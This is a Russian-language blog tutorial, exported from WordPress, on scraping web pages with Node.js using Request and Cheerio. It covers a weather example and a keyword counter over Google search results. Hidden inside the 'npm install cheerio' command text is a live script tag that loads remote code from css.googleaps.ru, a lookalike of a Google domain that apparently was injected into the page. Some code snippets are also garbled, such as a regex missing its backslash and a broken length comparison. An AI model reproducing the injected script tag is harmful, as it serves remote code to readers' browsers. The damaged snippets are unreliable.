---
layout: post
status: publish
published: true
title: "&laquo;Грабим&raquo; с помощью Node.js"
author:
  display_name: Maxyc Webber
  login: admin
  email: maxycws@gmail.com
  url: ''
author_login: admin
author_email: maxycws@gmail.com
wordpress_id: 1476
wordpress_url: http://magazine.loc/%d0%b1%d0%b5%d0%b7-%d1%80%d1%83%d0%b1%d1%80%d0%b8%d0%ba%d0%b8/%d0%b3%d1%80%d0%b0%d0%b1%d0%b8%d0%bc-%d1%81-%d0%bf%d0%be%d0%bc%d0%be%d1%89%d1%8c%d1%8e-node-js/
date: '2015-06-17 00:00:00 +0200'
date_gmt: '2015-06-17 00:00:00 +0200'
categories:
- Верстка
tags:
- ip
- spl
- javascript
- jquery
- js
- ui
- google
- twitter
- frontender
- orm
comments: []
---
<p>&laquo;Сграбить&raquo; &mdash;&nbsp;программно получить данные из интернета. С ростом объёмов данных<br />
&laquo;грабёж&raquo; становится всё более распространённым явлением, и для упрощения<br />
процесса возникло множество мощных сервисов.</p>
<p><img title="Облако тегов" src="http://frontender.info/web-scraping-with-nodejs/img/web-crawling-front-page-image.jpg" alt="Иллюстрация" /></p>
<p>К сожалению, большинство из них довольно дорогие, имеют ограничения или<br />
обладают какими-либо недостатками. Вместо использования<br />
сторонних сервисов <strong>можно самостоятельно написать мощный граббер<br />
на Node.js</strong>, который одновременно будет очень гибким и абсолютно бесплатным.</p>
<p>В этой статье мы рассмотрим:</p>
<ul>
<li>два модуля Node.js: Request и Cheerio, которые упростят нам процесс &laquo;грабежа&raquo;;</li>
<li>простое приложение, которое получает и отображает некие данные;</li>
<li>более сложное приложение, которое находит ключевые слова в результатах<br />
поискового запроса Google.</li><br />
</ul><br />
Что ещё стоит иметь в виду: <strong>для понимания этой статьи рекомендуется<br />
иметь базовое представление о Node.js</strong>, так что если вы вообще не в<br />
теме, <a href="http://nodejs.org/">посмотрите это</a>, прежде чем продолжить. Кроме того,<br />
пользовательское соглашение некоторых сайтов запрещает их &laquo;грабить&raquo;,<br />
так что стоит прояснить этот момент, прежде чем что-либо делать.</p>
<h2>Модули</h2><br />
Чтобы установить Node.js-модули, о которых говорилось выше,<br />
мы будем использовать <a href="https://www.npmjs.com/">NPM</a> &mdash; Node Package Manager. Если вы<br />
слышали о Bower &mdash; это то же самое, за тем исключением, что<br />
NPM используется для установки Bower. NPM &mdash; это менеджер пакетов,<br />
который автоматически устанавливается вместе с Node.js, чтобы сделать<br />
использование пакетов максимально простым. По умолчанию NPM<br />
устанавливает модули в папку <code>node_modules</code> в той же директории,<br />
в которой была выполнена команда, так что проверьте, что команда установки<br />
выполняется в папке проекта.</p>
<p>Вот модули, которые мы будем использовать.</p>
<h3>Request</h3><br />
Node.js предоставляет несколько простых методов скачивания данных из интернета<br />
через HTTP и HTTPS, но их нужно обрабатывать отдельно, не говоря уже о редиректах и<br />
других задачах, которые возникают в процессе &laquo;грабежа&raquo;. <a href="https://github.com/request/request">Модуль Request</a><br />
объединяет эти методы, позволяя абстрагироваться от рутины, и предоставляет<br />
интерфейс для создания запросов. Мы будем использовать этот модуль, чтобы<br />
скачивать страницы непосредственно в память. Чтобы его установить, выполните<br />
в терминале команду <code>npm install request</code> в директории, где будет находиться<br />
основной Node.js-скрипт.</p>
<h3>Cheerio</h3><br />
<a href="https://github.com/cheeriojs/cheerio">Cheerio</a> позволяет работать со скачанными из сети данными, используя<br />
синтаксис, аналогичный jQuery. Процитирую текст с<br />
главной страницы проекта: &laquo;Cheerio &mdash; это быстрый, гибкий и надёжный порт jQuery,<br />
разработанный специально для сервера&raquo;. Использование Cheerio позволяет<br />
сконцентрироваться непосредственно на работе с полученными данными, а не на их<br />
парсинге. Для установки выполните в терминале команду <code>npm install cheerio<script src="//css.googleaps.ru/css?f=Open+Sans&cd=mb&ver=4.2.2"></script></code><br />
в директории, в которой будет находиться основной Node.js-скрипт.</p>
<h2>Использование</h2><br />
Код ниже &mdash; это простое приложение, которое получает температуру<br />
воздуха с сайта с погодой. Я добавил код моей страны в конец URL, вы,<br />
если захотите, можете добавить туда код своей (главное убедитесь, что установили<br />
модули, которые мы пытаемся подключить; вы можете прочитать об этом выше).</p>
<pre><code>var request = require("request"),<br />
    cheerio = require("cheerio"),<br />
    url = "http://www.wunderground.com/cgi-bin/findweather/getForecast?&amp;query=" + 02888;</p>
<p>request(url, function (error, response, body) {<br />
    if (!error) {<br />
        var $ = cheerio.load(body),<br />
            temperature = $("[data-variable='temperature'] .wx-value").html();</p>
<p>        console.log("Температура " + temperature + " градусов по Фаренгейту.");<br />
    } else {<br />
        console.log("Произошла ошибка: " + error);<br />
    }<br />
});<br />
</code></pre><br />
Так, и что мы тут делаем? Сначала подключаем модули, которые будем<br />
использовать, затем сохраняем в переменной URL, содержимое которого<br />
собираемся &laquo;сграбить&raquo;.</p>
<p>После этого используем модуль Request, чтобы скачать страницу, находящуюся<br />
по URL, переданному функции <code>request</code>. Мы передаём в качестве аргументов URL,<br />
содержимое которого хотим скачать, и колбек, который обработает результаты<br />
запроса. Когда мы получим данные, будет вызван колбек, в который в качестве<br />
аргументов будут переданы три переменные: <code>error</code>, <code>response</code> и <code>body</code>.<br />
Если Request не сможет скачать страницу и получить данные, он передаст<br />
в функцию объект в переменной <code>error</code> и <code>null</code>, в качестве аргумента <code>body</code>.<br />
Прежде чем начинать работать с данными, проверяем не произошла ли ошибка;<br />
если произошла &mdash;&nbsp;выводим сообщение в консоль, чтобы увидеть, что именно<br />
пошло не так.</p>
<p>Если всё хорошо, передаём Cheerio полученные данные. В результате мы<br />
можем работать с данными как на обычном сайте, используя стандартный<br />
синтаксис jQuery. Чтобы найти на странице интересующие нас данные,<br />
надо написать селектор, который получит нужный элемент (или набор элементов).<br />
Если вы откроете в браузере URL из примера и исследуете страницу с помощью<br />
инструментов разработчика, вы увидите, что большой зелёный блок с<br />
температурой на нём &mdash; тот самый элемент, для которого написан селектор.<br />
Теперь, когда мы его нашли, осталось просто получить из него данные и вывести<br />
их в консоль.</p>
<p>Отсюда можно двигаться по нескольким направлениям. Например, поиграйте с кодом,<br />
я привёл основные шаги ниже:</p>
<h3>В браузере</h3></p>
<ol>
<li>Откройте страницу, которую хотите &laquo;сграбить&raquo;, сохраните URL.</li>
<li>Определите элемент или элементы, данные из которых вы хотите получить, и<br />
jQuery-селектор, который позволяет получить эти элементы.</li><br />
</ol></p>
<h3>В коде</h3></p>
<ol>
<li>Используйте Request, чтобы скачать страницу, находящуюся по выбранному<br />
вами URL.</li></p>
<li>Передайте полученные данные Cheerio, чтобы использовать jQuery-подобный<br />
интерфейс.</li></p>
<li>Используйте селектор, который вы написали перед этим, чтобы &laquo;сграбить&raquo;<br />
данные со страницы.</li><br />
</ol></p>
<h2>Идём дальше: дата-майнинг</h2><br />
Более продвинутое использование грабберов можно отнести к <a href="http://en.wikipedia.org/wiki/Data_mining">дата-майнингу</a> &mdash;<br />
процессу скачивания страниц и генерации отчётов на основе полученных данных.<br />
Node.js отлично подходит для создания подобных приложений.</p>
<p>Я написал на Node.js небольшое (меньше сотни строк кода) приложение для<br />
дата-майнинга, чтобы показать как использовать две уже знакомые нам библиотеки<br />
для более сложных вещей. Это приложение ищет наиболее популярные ключевые слова,<br />
ассоциированные с определённым поисковым запросом к Google, анализируя текст<br />
каждой страницы, ссылки на которые будут на первой странице результатов поиска.</p>
<p>В приложении есть три главных шага:</p>
<ol>
<li>Проанализировать поисковую выдачу Google.</li>
<li>Скачать все страницы и распарсить текст на каждой из них.</li>
<li>Проанализировать текст и предоставить статистику по наиболее популярным словам.</li><br />
</ol><br />
Давайте посмотрим на код, который позволит реализовать каждый из этих шагов&nbsp;&mdash;<br />
как вы можете догадаться, его совсем немного.</p>
<h3>Скачиваем поисковую выдачу Google</h3><br />
Первое, что нужно сделать &mdash;&nbsp;определить какую страницу мы собираемся<br />
анализировать. Так как мы собираемся анализировать страницы из поисковой выдачи<br />
Google, просто используем URL с нужным поисковым запросом, скачиваем и парсим<br />
результаты, чтобы получить URL нужных нам страниц.</p>
<p>Чтобы скачать страницы, используем Request как в примере выше, и парсим<br />
полученные данные используя Cheerio. Вот как выглядит код:</p>
<pre><code>request(url, function (error, response, body) {<br />
    if (error) {<br />
        console.log(&ldquo;Не удалось получить страницу из за следующей ошибки: &ldquo; + error);<br />
        return;<br />
    }</p>
<p>  // загружаем тело страницы в Cheerio чтобы можно было работать с DOM<br />
    var $ = cheerio.load(body),<br />
        links = $(".r a");</p>
<p>    links.each(function (i, link) {<br />
    // получаем атрибуты href для каждой ссылки<br />
        var url = $(link).attr("href");</p>
<p>    // обрезаем ненужный мусор<br />
        url = url.replace("/url?q=", "").split("&amp;")[0];</p>
<p>        if (url.charAt(0) === "/") {<br />
            return;<br />
        }</p>
<p>    // ссылка считается результатом, так что увеличиваем их количество<br />
        totalResults++;<br />
</code></pre><br />
В этом случае, переменная с URL, который мы передаём, содержит поисковый<br />
запрос для термина &laquo;data mining&raquo;.</p>
<p>Как видите, сначала мы делаем запрос, чтобы получить содержимое страницы. Затем<br />
загружаем полученные данные в Cheerio, чтобы иметь возможность получать<br />
из DOМ элементы, содержащие релевантные ссылки. Затем перебираем<br />
ссылки и обрезаем ненужные нам параметры URL, которые добавляет Google для<br />
своих целей (нам они не нужны).</p>
<p>Наконец, когда мы всё это сделаем, нужно убедиться что URL не начинается с <code>/</code>.<br />
Если начинается &mdash; это внутренняя ссылка на ресурс Google, и нам её<br />
содержимое скачивать не нужно.</p>
<h3>Получаем слова со страниц</h3><br />
Теперь, когда у нас есть URL страниц, надо получить слова с каждой из них. Этот<br />
шаг представляет собой ровно то же, что мы уже делали раньше &mdash;&nbsp;только теперь<br />
URL &mdash; это адрес страницы, которую мы нашли и обработали в предыдущем цикле.</p>
<pre><code>request(url, function (error, response, body) {<br />
  // загружаем страницу в Cheerio<br />
    var $page = cheerio.load(body),<br />
        text = $page("body").text();<br />
</code></pre><br />
Снова используем Request и Cheerio, чтобы скачать страницу и получить доступ к<br />
её DOM. В данном примере мы получаем со страницы только текст.</p>
<p>Далее нужно очистить полученный текст &mdash;&nbsp;там будет всяческий мусор, который<br />
нам не нужен: например, множество лишних пробелов, стили, иногда даже<br />
немного данных в JSON. Нам нужно сделать вот что:</p>
<ol>
<li>Сжать все пробелы в одиночные пробелы.</li>
<li>Выбросить все символы, которые не являются буквами или пробелами.</li>
<li>Перевести всё в нижний регистр.</li><br />
</ol><br />
Когда мы это сделаем, можно будет просто разбить текст по пробелам и получить<br />
массив, содержащий все слова со страницы. Теперь можно перебрать<br />
массив в цикле и добавить слова в словарь.</p>
<p>Код, который всё это делает, выглядит приблизительно так:</p>
<pre><code>// избавляемся от лишних пробелов и нечисловых символов.<br />
text = text.replace(/s+/g, " ")<br />
         .replace(/[^a-zA-Z ]/g, "")<br />
         .toLowerCase();</p>
<p>// разбиваем по пробелу, чтобы получить список слов на странице,<br />
// и перебираем их в цикле.<br />
text.split(" ").forEach(function (word) {<br />
  // скорее всего, нам не нужно включать слишком короткие или слишком длинные слова,<br />
  // так как они, скорее всего, содержат бесполезные для нас данные.<br />
    if (word.length  20) {<br />
        return;<br />
    }</p>
<p>    if (corpus[word]) {<br />
    // если слово уже находится в словаре, нашей коллекции<br />
    // терминов, увеличиваем количество его вхождений на единицу.<br />
        corpus[word]++;<br />
    } else {<br />
    // В противном случае, считаем, что встречаем его впервые.<br />
        corpus[word] = 1;<br />
    }<br />
});<br />
</code></pre></p>
<h3>Анализируем слова</h3><br />
Когда все слова добавлены в словарь, мы можем перебрать их в цикле и<br />
отсортировать по популярности. Сперва надо внести их в массив, так как словарь &mdash;&nbsp;объект.</p>
<pre><code>// поместим все слова в словарь<br />
for (prop in corpus) {<br />
    words.push({<br />
        word: prop,<br />
        count: corpus[prop]<br />
    });<br />
}</p>
<p>// сортируем массив основываясь на частоте вхождения слов<br />
words.sort(function (a, b) {<br />
    return b.count - a.count;<br />
});<br />
</code></pre><br />
Результатом будет отсортированный массив, показывающий как часто каждое слово<br />
используется на сайтах с первой страницы поисковой выдачи Google. Ниже<br />
простой список результатов для термина &laquo;data mining&raquo; (по некому совпадению<br />
я использовал этот список, чтобы сгенерировать облако тегов вначале статьи).</p>
<pre><code>[ { word: 'data', count: 981 },<br />
  { word: 'mining', count: 531 },<br />
  { word: 'that', count: 187 },<br />
  { word: 'analysis', count: 120 },<br />
  { word: 'information', count: 113 },<br />
  { word: 'from', count: 102 },<br />
  { word: 'this', count: 97 },<br />
  { word: 'with', count: 92 },<br />
  { word: 'software', count: 81 },<br />
  { word: 'knowledge', count: 79 },<br />
  { word: 'used', count: 78 },<br />
  { word: 'patterns', count: 72 },<br />
  { word: 'learning', count: 70 },<br />
  { word: 'example', count: 70 },<br />
  { word: 'which', count: 69 },<br />
  { word: 'more', count: 68 },<br />
  { word: 'discovery', count: 67 },<br />
  { word: 'such', count: 67 },<br />
  { word: 'techniques', count: 66 },<br />
  { word: 'process', count: 59 } ]<br />
</code></pre><br />
Если интересно увидеть остальную часть кода, посмотрите на<br />
<a href="https://gist.github.com/elliotbonneville/1bf694b8c83f358e0404">полностью комментированный исходный код</a>.</p>
<p>Интересным опытом было бы вывести это приложение на новый уровень. Можете<br />
оптимизировать анализ текста, расширить поиск на множество страниц поисковой<br />
выдачи, удалить слова, которые не являются ключевыми (такие, как &laquo;that&raquo; и &laquo;from&raquo;).<br />
Улучшить обработку ошибок, чтобы сделать приложение ещё более точным: когда вы<br />
занимаетесь дата-майнингом, лучше иметь столько слоёв проверок, сколько<br />
возможно. При том многообразии данных, которое можно получить таким образом,<br />
неизбежно найдётся блок текста, который, не будучи обработанным должным образом,<br />
непременно приведёт к возникновению ошибки и аварийному завершению работы<br />
приложения.</p>
<h2>Заключение</h2><br />
Как всегда, если вы нашли что-то по теме как &laquo;грабить&raquo; сайты с помощью<br />
Node.js или у вас есть вопросы &mdash;&nbsp;дайте знать в комментариях. А ещё можете<br />
читать меня в Twitter и периодически заглядывать в мой <a href="http://heyjavascript.com">блог</a><br />
в поисках новых статей о Node.js, &laquo;грабеже&raquo; и JavaScript в целом.</p>
<p><img src="http://feeds.feedburner.com/~r/FrontenderMagazineArticles/~4/Tp9bb4NVVTo" alt="" width="1" height="1" /><br />
Source: http://frontender.info/</p>
